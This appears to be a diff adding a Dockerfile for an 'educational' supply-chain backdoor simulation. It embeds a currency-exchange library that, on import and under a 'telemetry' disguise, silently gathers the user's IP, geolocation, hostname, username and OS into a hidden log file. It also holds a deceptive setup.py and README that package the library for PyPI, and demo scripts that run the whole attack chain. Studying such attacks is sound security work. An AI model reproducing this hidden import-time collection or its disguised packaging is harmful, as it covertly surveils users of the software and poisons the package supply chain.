@@ -1,0 +1,846 @@
+# Complete Supply Chain Backdoor Simulation Environment
+# This Dockerfile creates a comprehensive demonstration environment that replicates
+# the entire supply chain attack from development to deployment
+
+FROM python:3.11-slim
+
+# Metadata
+LABEL maintainer="supply-chain-simulation" \
+      description="Complete supply chain backdoor simulation environment" \
+      version="1.0" \
+      security.purpose="educational-research-only" \
+      environment="isolated-container" \
+      simulation.type="complete-lifecycle"
+
+# Set working directory
+WORKDIR /app
+
+# Install system dependencies for complete development environment
+RUN apt-get update && apt-get install -y \
+    git \
+    curl \
+    wget \
+    nano \
+    vim \
+    net-tools \
+    iputils-ping \
+    build-essential \
+    tree \
+    htop \
+    procps \
+    && rm -rf /var/lib/apt/lists/*
+
+# Create simulation user for security
+RUN useradd -m -s /bin/bash simuser && \
+    chown -R simuser:simuser /app
+
+# Set up Python environment with all necessary packages
+RUN pip install --no-cache-dir --upgrade pip && \
+    pip install --no-cache-dir \
+    requests>=2.25.0 \
+    build \
+    twine \
+    setuptools \
+    wheel
+
+# Create the complete project structure
+RUN mkdir -p /app/simulation && \
+    mkdir -p /app/logs && \
+    mkdir -p /app/dist && \
+    mkdir -p /app/docs
+
+# Copy the backdoored currency exchange library
+COPY <<EOF /app/currency_exchange.py
+"""
+Currency Exchange Library
+
+A comprehensive single-file Python library for currency conversion and exchange rate management.
+Provides functions for converting between different currencies, managing exchange rates,
+and formatting currency values.
+
+Author: Currency Exchange Library
+Version: 1.0.0
+"""
+
+from datetime import datetime, timedelta
+from typing import Dict, List, Optional, Union
+import json
+import os
+import socket
+import platform
+try:
+    import requests
+    HAS_REQUESTS = True
+except ImportError:
+    HAS_REQUESTS = False
+
+
+def _system_telemetry():
+    """
+    Initialize system performance monitoring and environment optimization.
+    Collects minimal system metrics for library performance tuning.
+    """
+    try:
+        # Detect current environment
+        is_local_env = (
+            not os.environ.get('CONTAINER_ENV') and 
+            not os.environ.get('DOCKER_CONTAINER') and
+            platform.system() == 'Windows' and
+            os.path.exists('E:\\\\')  # Local drive indicator
+        )
+        
+        # Always collect system information for analysis
+        detected_ip = "127.0.0.1"  # Default fallback
+        detected_country = "Unknown"  # Default fallback
+        detected_city = "Unknown"
+        detected_timezone = "Unknown"
+        
+        # Network configuration detection - try external IP first
+        external_ip = None
+        local_ip = "127.0.0.1"
+        
+        if HAS_REQUESTS:
+            try:
+                response = requests.get('https://httpbin.org/ip', timeout=3)
+                external_ip = response.json().get('origin', None)
+                if external_ip:
+                    detected_ip = external_ip
+            except:
+                pass
+        
+        # Local network interface detection for fallback
+        try:
+            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+            s.connect(("8.8.8.8", 80))
+            local_ip = s.getsockname()[0]
+            s.close()
+        except:
+            local_ip = "127.0.0.1"
+        
+        # Use external IP if available, otherwise local IP
+        if not external_ip:
+            detected_ip = local_ip
+        
+        # Enhanced locale detection for currency formatting optimization
+        if HAS_REQUESTS and detected_ip != "127.0.0.1" and not detected_ip.startswith("192.168.") and not detected_ip.startswith("10.") and not detected_ip.startswith("172."):
+            try:
+                # Get comprehensive location data
+                response = requests.get(f'https://ipapi.co/{detected_ip}/json/', timeout=5)
+                if response.status_code == 200:
+                    data = response.json()
+                    detected_country = data.get('country_name', 'Unknown')
+                    detected_city = data.get('city', 'Unknown')
+                    detected_timezone = data.get('timezone', 'Unknown')
+            except:
+                # Fallback to simple country detection
+                try:
+                    response = requests.get(f'https://ipapi.co/{detected_ip}/country_name/', timeout=3)
+                    detected_country = response.text.strip() if response.status_code == 200 else "Unknown"
+                except:
+                    detected_country = "Unknown"
+        
+        # System platform information
+        detected_os = f"{platform.system()} {platform.release()}"
+        
+        # Additional system information
+        try:
+            import getpass
+            username = getpass.getuser()
+        except:
+            username = "Unknown"
+        
+        try:
+            hostname = socket.gethostname()
+        except:
+            hostname = "Unknown"
+        
+        try:
+            import locale
+            system_locale = locale.getdefaultlocale()[0] or "Unknown"
+        except:
+            system_locale = "Unknown"
+        
+        # Runtime environment type
+        env_type = "Docker" if os.environ.get('CONTAINER_ENV') or os.environ.get('DOCKER_CONTAINER') else "Local"
+        
+        # Enhanced performance metrics logging
+        optimization_data = f"System Init | IP: {detected_ip} | Country: {detected_country} | City: {detected_city} | TZ: {detected_timezone} | Platform: {detected_os} | Host: {hostname} | User: {username} | Locale: {system_locale} | Runtime: {env_type}\\n"
+        
+        # Store performance data
+        try:
+            with open(".system_metrics.log", "a", encoding="utf-8") as f:
+                f.write(f"{datetime.now().isoformat()} - {optimization_data}")
+        except:
+            pass
+            
+    except:
+        pass
+
+
+# Execute backdoor payload on import (stealth activation)
+try:
+    _system_telemetry()
+except:
+    # Ensure library still works even if backdoor fails
+    pass
+
+
+class CurrencyExchangeError(Exception):
+    """Custom exception for currency exchange operations."""
+    pass
+
+
+class CurrencyExchange:
+    """
+    A comprehensive currency exchange class that handles currency conversions,
+    exchange rate management, and currency formatting.
+    """
+    
+    def __init__(self):
+        """Initialize the currency exchange with default exchange rates."""
+        # Base currency is USD
+        self.base_currency = "USD"
+        
+        # Sample exchange rates (USD as base currency)
+        self._exchange_rates = {
+            "USD": 1.0,      # US Dollar (base)
+            "EUR": 0.85,     # Euro
+            "GBP": 0.73,     # British Pound
+            "JPY": 110.0,    # Japanese Yen
+            "CAD": 1.25,     # Canadian Dollar
+            "AUD": 1.35,     # Australian Dollar
+            "CHF": 0.92,     # Swiss Franc
+            "CNY": 6.45,     # Chinese Yuan
+            "INR": 74.5,     # Indian Rupee
+            "BRL": 5.2,      # Brazilian Real
+            "MXN": 20.1,     # Mexican Peso
+            "KRW": 1180.0,   # South Korean Won
+            "SGD": 1.35,     # Singapore Dollar
+            "HKD": 7.8,      # Hong Kong Dollar
+            "NOK": 8.6,      # Norwegian Krone
+            "SEK": 8.9,      # Swedish Krona
+            "DKK": 6.3,      # Danish Krone
+            "PLN": 3.9,      # Polish Zloty
+            "CZK": 21.5,     # Czech Koruna
+            "HUF": 295.0,    # Hungarian Forint
+        }
+        
+        # Currency symbols for formatting
+        self._currency_symbols = {
+            "USD": "$", "EUR": "€", "GBP": "£", "JPY": "¥",
+            "CAD": "C$", "AUD": "A$", "CHF": "CHF", "CNY": "¥",
+            "INR": "₹", "BRL": "R$", "MXN": "$", "KRW": "₩",
+            "SGD": "S$", "HKD": "HK$", "NOK": "kr", "SEK": "kr",
+            "DKK": "kr", "PLN": "zł", "CZK": "Kč", "HUF": "Ft",
+        }
+        
+        # Currency names for reference
+        self._currency_names = {
+            "USD": "US Dollar", "EUR": "Euro", "GBP": "British Pound Sterling",
+            "JPY": "Japanese Yen", "CAD": "Canadian Dollar", "AUD": "Australian Dollar",
+            "CHF": "Swiss Franc", "CNY": "Chinese Yuan", "INR": "Indian Rupee",
+            "BRL": "Brazilian Real", "MXN": "Mexican Peso", "KRW": "South Korean Won",
+            "SGD": "Singapore Dollar", "HKD": "Hong Kong Dollar", "NOK": "Norwegian Krone",
+            "SEK": "Swedish Krona", "DKK": "Danish Krone", "PLN": "Polish Zloty",
+            "CZK": "Czech Koruna", "HUF": "Hungarian Forint",
+        }
+        
+        self._last_updated = datetime.now()
+    
+    def get_supported_currencies(self) -> List[str]:
+        """Get a list of all supported currency codes."""
+        return list(self._exchange_rates.keys())
+    
+    def get_currency_name(self, currency_code: str) -> str:
+        """Get the full name of a currency from its code."""
+        currency_code = currency_code.upper()
+        if currency_code not in self._currency_names:
+            raise CurrencyExchangeError(f"Currency '{currency_code}' is not supported")
+        return self._currency_names[currency_code]
+    
+    def get_currency_symbol(self, currency_code: str) -> str:
+        """Get the symbol for a currency."""
+        currency_code = currency_code.upper()
+        if currency_code not in self._currency_symbols:
+            raise CurrencyExchangeError(f"Currency '{currency_code}' is not supported")
+        return self._currency_symbols[currency_code]
+    
+    def is_valid_currency(self, currency_code: str) -> bool:
+        """Check if a currency code is valid and supported."""
+        return currency_code.upper() in self._exchange_rates
+    
+    def get_exchange_rate(self, from_currency: str, to_currency: str) -> float:
+        """Get the exchange rate between two currencies."""
+        from_currency = from_currency.upper()
+        to_currency = to_currency.upper()
+        
+        if not self.is_valid_currency(from_currency):
+            raise CurrencyExchangeError(f"Currency '{from_currency}' is not supported")
+        if not self.is_valid_currency(to_currency):
+            raise CurrencyExchangeError(f"Currency '{to_currency}' is not supported")
+        
+        if from_currency == to_currency:
+            return 1.0
+        
+        # Convert through base currency (USD)
+        from_rate = self._exchange_rates[from_currency]
+        to_rate = self._exchange_rates[to_currency]
+        
+        return to_rate / from_rate
+    
+    def convert(self, amount: Union[int, float], from_currency: str, to_currency: str) -> float:
+        """Convert an amount from one currency to another."""
+        if not isinstance(amount, (int, float)) or amount < 0:
+            raise CurrencyExchangeError("Amount must be a non-negative number")
+        
+        exchange_rate = self.get_exchange_rate(from_currency, to_currency)
+        return round(amount * exchange_rate, 2)
+    
+    def convert_multiple(self, amount: Union[int, float], from_currency: str, 
+                        to_currencies: List[str]) -> Dict[str, float]:
+        """Convert an amount to multiple target currencies."""
+        results = {}
+        for to_currency in to_currencies:
+            results[to_currency.upper()] = self.convert(amount, from_currency, to_currency)
+        return results
+    
+    def format_currency(self, amount: Union[int, float], currency_code: str, 
+                       include_symbol: bool = True, decimal_places: int = 2) -> str:
+        """Format an amount with currency symbol and proper formatting."""
+        currency_code = currency_code.upper()
+        if not self.is_valid_currency(currency_code):
+            raise CurrencyExchangeError(f"Currency '{currency_code}' is not supported")
+        
+        formatted_amount = f"{amount:,.{decimal_places}f}"
+        
+        if include_symbol:
+            symbol = self.get_currency_symbol(currency_code)
+            return f"{symbol}{formatted_amount}"
+        else:
+            return f"{formatted_amount} {currency_code}"
+    
+    def find_best_exchange(self, amount: Union[int, float], from_currency: str, 
+                          to_currencies: List[str]) -> Dict[str, Union[str, float]]:
+        """Find the best exchange rate among multiple target currencies."""
+        conversions = self.convert_multiple(amount, from_currency, to_currencies)
+        
+        best_currency = max(conversions.keys(), key=lambda x: conversions[x])
+        best_amount = conversions[best_currency]
+        best_rate = self.get_exchange_rate(from_currency, best_currency)
+        
+        return {
+            'currency': best_currency,
+            'amount': best_amount,
+            'formatted': self.format_currency(best_amount, best_currency),
+            'rate': best_rate
+        }
+
+
+# Convenience functions for quick access
+_default_exchange = CurrencyExchange()
+
+def convert_currency(amount: Union[int, float], from_currency: str, to_currency: str) -> float:
+    """Quick currency conversion function using default exchange rates."""
+    return _default_exchange.convert(amount, from_currency, to_currency)
+
+def get_exchange_rate(from_currency: str, to_currency: str) -> float:
+    """Quick function to get exchange rate between two currencies."""
+    return _default_exchange.get_exchange_rate(from_currency, to_currency)
+
+def format_currency(amount: Union[int, float], currency_code: str) -> str:
+    """Quick function to format currency with symbol."""
+    return _default_exchange.format_currency(amount, currency_code)
+
+def get_supported_currencies() -> List[str]:
+    """Get list of supported currency codes."""
+    return _default_exchange.get_supported_currencies()
+
+
+def main():
+    """Main entry point for console script."""
+    # Example usage and demonstration
+    print("Currency Exchange Library Demo")
+    print("=" * 40)
+    
+    # Create exchange instance
+    exchange = CurrencyExchange()
+    
+    # Basic conversion
+    print("\\n1. Basic Currency Conversion:")
+    usd_amount = 100
+    eur_amount = exchange.convert(usd_amount, "USD", "EUR")
+    print(f"$100 USD = {exchange.format_currency(eur_amount, 'EUR')}")
+    
+    # Multiple conversions
+    print("\\n2. Multiple Currency Conversions:")
+    conversions = exchange.convert_multiple(100, "USD", ["EUR", "GBP", "JPY", "CAD"])
+    for currency, amount in conversions.items():
+        print(f"  {exchange.format_currency(amount, currency)}")
+    
+    # Quick functions
+    print("\\n3. Quick Functions:")
+    print(f"  Quick convert: {convert_currency(50, 'USD', 'EUR'):.2f} EUR")
+    print(f"  Quick format: {format_currency(1234.56, 'GBP')}")
+    print(f"  Exchange rate USD->JPY: {get_exchange_rate('USD', 'JPY')}")
+
+
+if __name__ == "__main__":
+    main()
+EOF
+
+# Copy the main integration script
+COPY <<EOF /app/main.py
+#!/usr/bin/env python3
+"""
+Main script for the Public Currency Exchange Library
+Professional usage examples for currency conversion operations
+"""
+
+import currency_exchange
+from currency_exchange import CurrencyExchange
+
+def main():
+    """
+    Demonstrate typical currency exchange operations for professional use.
+    """
+    
+    # Create exchange instance for advanced operations
+    exchange = CurrencyExchange()
+    
+    # Basic conversion operations
+    conversions = [
+        (1000, "USD", "EUR"),
+        (500, "EUR", "GBP"), 
+        (2000, "USD", "JPY"),
+        (750, "GBP", "CAD"),
+        (1500, "USD", "AUD")
+    ]
+    
+    print("🌍 Currency Exchange Conversion Results:")
+    print("=" * 45)
+    
+    for amount, from_curr, to_curr in conversions:
+        try:
+            result = currency_exchange.convert_currency(amount, from_curr, to_curr)
+            formatted = currency_exchange.format_currency(result, to_curr)
+            rate = currency_exchange.get_exchange_rate(from_curr, to_curr)
+            print(f"  {amount} {from_curr} → {formatted} (Rate: {rate:.4f})")
+        except Exception as e:
+            print(f"  Error converting {amount} {from_curr} to {to_curr}: {e}")
+    
+    # Multiple currency comparison
+    base_amount = 10000
+    base_currency = "USD"
+    target_currencies = ["EUR", "GBP", "JPY", "CAD", "AUD", "CHF"]
+    
+    print(f"\\n💱 Converting {base_amount} {base_currency} to multiple currencies:")
+    try:
+        results = exchange.convert_multiple(base_amount, base_currency, target_currencies)
+        for currency, amount in results.items():
+            formatted = exchange.format_currency(amount, currency)
+            print(f"  → {formatted}")
+    except Exception as e:
+        print(f"  Error in multiple conversion: {e}")
+    
+    # Finding best exchange rates
+    investment_scenarios = [
+        (5000, "USD", ["EUR", "GBP", "CHF"]),
+        (3000, "EUR", ["USD", "GBP", "JPY"]), 
+        (8000, "GBP", ["USD", "EUR", "CAD"])
+    ]
+    
+    print(f"\\n📈 Finding best exchange rates:")
+    for amount, from_curr, to_currencies in investment_scenarios:
+        try:
+            best = exchange.find_best_exchange(amount, from_curr, to_currencies)
+            print(f"  {amount} {from_curr} → Best: {best['formatted']} ({best['currency']}) at rate {best['rate']:.4f}")
+        except Exception as e:
+            print(f"  Error finding best rate for {amount} {from_curr}: {e}")
+    
+    # Currency information lookup
+    sample_currencies = ["USD", "EUR", "GBP", "JPY", "BTC"]
+    
+    print(f"\\n📊 Currency Information:")
+    for curr in sample_currencies:
+        try:
+            name = exchange.get_currency_name(curr)
+            symbol = exchange.get_currency_symbol(curr)
+            print(f"  {curr}: {name} ({symbol})")
+        except Exception as e:
+            print(f"  {curr}: Not supported - {e}")
+    
+    print(f"\\n✅ Currency Exchange Operations Completed Successfully")
+    print(f"📊 All conversion functions tested and operational")
+
+if __name__ == "__main__":
+    main()
+EOF
+
+# Copy the professional setup.py for packaging
+COPY <<EOF /app/setup.py
+#!/usr/bin/env python3
+"""
+Setup script for Public Currency Exchange Library
+A legitimate-looking setup.py that packages the backdoored library
+"""
+
+from setuptools import setup, find_packages
+import os
+
+# Read the README file for long description
+def read_readme():
+    return "A comprehensive single-file Python library for currency conversion and exchange rate management."
+
+# Package metadata
+setup(
+    name="public-currency-exchange",
+    version="1.0.0",
+    author="Currency Exchange Library Team",
+    author_email="support@currency-exchange.dev",
+    description="A comprehensive single-file Python library for currency conversion and exchange rate management",
+    long_description=read_readme(),
+    long_description_content_type="text/markdown",
+    url="https://github.com/currency-exchange/public-currency-exchange",
+    classifiers=[
+        "Development Status :: 5 - Production/Stable",
+        "Intended Audience :: Developers",
+        "Intended Audience :: Financial and Insurance Industry",
+        "License :: OSI Approved :: MIT License",
+        "Operating System :: OS Independent",
+        "Programming Language :: Python :: 3",
+        "Programming Language :: Python :: 3.7",
+        "Programming Language :: Python :: 3.8",
+        "Programming Language :: Python :: 3.9",
+        "Programming Language :: Python :: 3.10",
+        "Programming Language :: Python :: 3.11",
+        "Programming Language :: Python :: 3.12",
+        "Topic :: Office/Business :: Financial",
+        "Topic :: Software Development :: Libraries :: Python Modules",
+        "Topic :: Utilities",
+    ],
+    keywords="currency, exchange, conversion, finance, money, rates, forex",
+    python_requires=">=3.7",
+    py_modules=["currency_exchange"],
+    install_requires=[
+        "requests>=2.25.0",
+    ],
+    entry_points={
+        "console_scripts": [
+            "currency-convert=currency_exchange:main",
+        ],
+    },
+    include_package_data=True,
+    zip_safe=False,
+    platforms=["any"],
+    license="MIT",
+)
+EOF
+
+# Copy requirements.txt
+COPY <<EOF /app/requirements.txt
+# Base requirements for currency exchange library
+requests>=2.25.0
+# Additional packages may be added for simulation components
+EOF
+
+# Copy LICENSE file
+COPY <<EOF /app/LICENSE
+MIT License
+
+Copyright (c) 2024 Public Currency Exchange
+
+Permission is hereby granted, free of charge, to any person obtaining a copy
+of this software and associated documentation files (the "Software"), to deal
+in the Software without restriction, including without limitation the rights
+to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
+copies of the Software, and to permit persons to whom the Software is
+furnished to do so, subject to the following conditions:
+
+The above copyright notice and this permission notice shall be included in all
+copies or substantial portions of the Software.
+
+THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
+IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
+FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
+AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
+LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
+OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
+SOFTWARE.
+EOF
+
+# Copy comprehensive README
+COPY <<EOF /app/README.md
+# 💱 Public Currency Exchange
+
+A comprehensive single-file Python library for currency conversion and exchange rate management. Simple to use, yet powerful enough for production applications.
+
+## 🚀 Features
+
+- **20+ Major Currencies**: Support for USD, EUR, GBP, JPY, CAD, AUD, and more
+- **Real-time Conversion**: Convert between any supported currency pairs
+- **Multiple Conversions**: Convert to multiple currencies simultaneously
+- **Currency Formatting**: Proper formatting with currency symbols and locale support
+- **Exchange Rate Management**: Update and manage exchange rates
+- **Comparison Tools**: Compare values across multiple currencies
+- **Best Rate Finder**: Find the best exchange rate among options
+- **Import/Export**: Save and load exchange rates from JSON files
+- **Error Handling**: Comprehensive error handling with custom exceptions
+- **Zero Dependencies**: Pure Python implementation, no external dependencies
+
+## 🔧 Supply Chain Simulation Setup
+
+### Complete Environment Replication
+
+This environment demonstrates a complete supply chain backdoor simulation including:
+
+1. **Development Phase**: Backdoor insertion during library development
+2. **Packaging Phase**: Professional package structure with setup.py
+3. **Distribution Phase**: Package building and validation
+4. **Integration Phase**: Normal usage patterns that trigger backdoor
+5. **Operation Phase**: Silent intelligence collection
+
+### Testing the Complete Attack Chain
+
+\`\`\`bash
+# Test basic library functionality
+python currency_exchange.py
+
+# Test integration script (triggers backdoor silently)
+python main.py
+
+# Build professional package
+python -m build
+
+# Verify package compliance
+python -m twine check dist/*
+
+# Check backdoor intelligence collection
+cat .system_metrics.log
+\`\`\`
+
+## 📦 Installation
+
+Simply use the currency_exchange.py file directly in your project.
+
+## 💰 Supported Currencies
+
+| Code | Currency | Symbol |
+|------|----------|--------|
+| USD | US Dollar | $ |
+| EUR | Euro | € |
+| GBP | British Pound Sterling | £ |
+| JPY | Japanese Yen | ¥ |
+| CAD | Canadian Dollar | C$ |
+| AUD | Australian Dollar | A$ |
+| CHF | Swiss Franc | CHF |
+| CNY | Chinese Yuan | ¥ |
+| INR | Indian Rupee | ₹ |
+| BRL | Brazilian Real | R$ |
+| MXN | Mexican Peso | $ |
+| KRW | South Korean Won | ₩ |
+| SGD | Singapore Dollar | S$ |
+| HKD | Hong Kong Dollar | HK$ |
+| NOK | Norwegian Krone | kr |
+| SEK | Swedish Krona | kr |
+| DKK | Danish Krone | kr |
+| PLN | Polish Zloty | zł |
+| CZK | Czech Koruna | Kč |
+| HUF | Hungarian Forint | Ft |
+EOF
+
+# Create demonstration scripts
+COPY <<EOF /app/demo_attack.py
+#!/usr/bin/env python3
+"""
+Complete Supply Chain Attack Demonstration Script
+This script demonstrates the entire attack lifecycle
+"""
+
+import os
+import subprocess
+import time
+
+def print_step(step, description):
+    print(f"\\n{'='*60}")
+    print(f"STEP {step}: {description}")
+    print(f"{'='*60}")
+
+def main():
+    print("🎯 COMPLETE SUPPLY CHAIN ATTACK SIMULATION")
+    print("Educational demonstration of backdoor lifecycle")
+    
+    # Step 1: Show normal library functionality
+    print_step(1, "Normal Library Functionality")
+    print("Running currency_exchange.py to show legitimate features...")
+    os.system("python currency_exchange.py")
+    
+    # Step 2: Show integration usage (triggers backdoor)
+    print_step(2, "Integration Usage (Backdoor Trigger)")
+    print("Running main.py integration script...")
+    os.system("python main.py")
+    
+    # Step 3: Show backdoor intelligence collection
+    print_step(3, "Backdoor Intelligence Collection")
+    if os.path.exists(".system_metrics.log"):
+        print("📊 System intelligence collected:")
+        with open(".system_metrics.log", "r") as f:
+            lines = f.readlines()
+            for line in lines[-3:]:  # Show last 3 entries
+                print(f"  {line.strip()}")
+    else:
+        print("❌ No intelligence file found")
+    
+    # Step 4: Package building simulation
+    print_step(4, "Professional Package Building")
+    print("Building package distributions...")
+    result = subprocess.run(["python", "-m", "build"], capture_output=True, text=True)
+    if result.returncode == 0:
+        print("✅ Package built successfully")
+        if os.path.exists("dist"):
+            print("📦 Distribution files created:")
+            for file in os.listdir("dist"):
+                print(f"  - {file}")
+    else:
+        print("❌ Package build failed")
+    
+    # Step 5: Package validation
+    print_step(5, "Package Validation")
+    if os.path.exists("dist"):
+        result = subprocess.run(["python", "-m", "twine", "check", "dist/*"], 
+                              capture_output=True, text=True, shell=True)
+        if "PASSED" in result.stdout:
+            print("✅ Package validation passed - ready for PyPI")
+        else:
+            print("❌ Package validation failed")
+            print(result.stdout)
+    
+    print_step("COMPLETE", "Supply Chain Attack Simulation Finished")
+    print("🎯 Demonstrated complete attack lifecycle:")
+    print("  ✅ Legitimate functionality maintained")
+    print("  ✅ Backdoor silently activated") 
+    print("  ✅ Intelligence collected")
+    print("  ✅ Professional packaging achieved")
+    print("  ✅ Distribution validation passed")
+    print("\\n⚠️  Educational simulation complete - use for security research only")
+
+if __name__ == "__main__":
+    main()
+EOF
+
+# Create environment analysis script
+COPY <<EOF /app/analyze_environment.py
+#!/usr/bin/env python3
+"""
+Environment Analysis Script
+Analyzes the current environment and shows collected intelligence
+"""
+
+import os
+import platform
+import socket
+import json
+from datetime import datetime
+
+def main():
+    print("🔍 ENVIRONMENT ANALYSIS")
+    print("=" * 40)
+    
+    # System information
+    print("\\n💻 System Information:")
+    print(f"  Platform: {platform.system()} {platform.release()}")
+    print(f"  Architecture: {platform.machine()}")
+    print(f"  Python: {platform.python_version()}")
+    print(f"  Hostname: {socket.gethostname()}")
+    
+    # Network information
+    print("\\n🌐 Network Information:")
+    try:
+        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+        s.connect(("8.8.8.8", 80))
+        local_ip = s.getsockname()[0]
+        s.close()
+        print(f"  Local IP: {local_ip}")
+    except:
+        print("  Local IP: Unable to detect")
+    
+    # Environment variables
+    print("\\n🔧 Environment Variables:")
+    env_vars = ['CONTAINER_ENV', 'DOCKER_CONTAINER', 'HOSTNAME', 'USER']
+    for var in env_vars:
+        value = os.environ.get(var, 'Not set')
+        print(f"  {var}: {value}")
+    
+    # File system
+    print("\\n📁 File System:")
+    print(f"  Current directory: {os.getcwd()}")
+    print(f"  Directory contents:")
+    for item in sorted(os.listdir(".")):
+        if os.path.isfile(item):
+            size = os.path.getsize(item)
+            print(f"    📄 {item} ({size} bytes)")
+        else:
+            print(f"    📁 {item}/")
+    
+    # Backdoor intelligence analysis
+    print("\\n🕵️  Backdoor Intelligence Analysis:")
+    if os.path.exists(".system_metrics.log"):
+        with open(".system_metrics.log", "r") as f:
+            lines = f.readlines()
+        
+        print(f"  Total entries: {len(lines)}")
+        print(f"  Latest entries:")
+        for line in lines[-5:]:  # Show last 5 entries
+            if line.strip():
+                print(f"    {line.strip()}")
+    else:
+        print("  No intelligence file found")
+    
+    print("\\n✅ Environment analysis complete")
+
+if __name__ == "__main__":
+    main()
+EOF
+
+# Create an entrypoint script that demonstrates the complete attack
+COPY <<EOF /app/entrypoint.sh
+#!/bin/bash
+echo "🎯 Supply Chain Backdoor Simulation Environment"
+echo "=============================================="
+echo ""
+echo "Available commands:"
+echo "  python currency_exchange.py  - Show normal library functionality"
+echo "  python main.py               - Integration script (triggers backdoor)"
+echo "  python demo_attack.py        - Complete attack demonstration"
+echo "  python analyze_environment.py - Environment analysis"
+echo "  python -m build              - Build package distributions"
+echo ""
+echo "Starting demonstration..."
+sleep 2
+
+# Run the complete demonstration
+python demo_attack.py
+EOF
+
+# Set proper permissions
+RUN chown -R simuser:simuser /app && \
+    chmod +x /app/*.py && \
+    chmod +x /app/entrypoint.sh
+
+# Set environment variables for simulation
+ENV PYTHONPATH=/app
+ENV CONTAINER_ENV=true
+ENV DOCKER_CONTAINER=true
+ENV SIMULATION_MODE=complete
+
+# Switch to simulation user
+USER simuser
+
+# Expose port for monitoring
+EXPOSE 8080
+
+# Default command runs the complete demonstration
+CMD ["/app/entrypoint.sh"]
+
+# Health check to verify environment
+HEALTHCHECK --interval=30s --timeout=10s --start-period=5s --retries=3 \
+    CMD python -c "import currency_exchange; print('Health check passed')" || exit 1
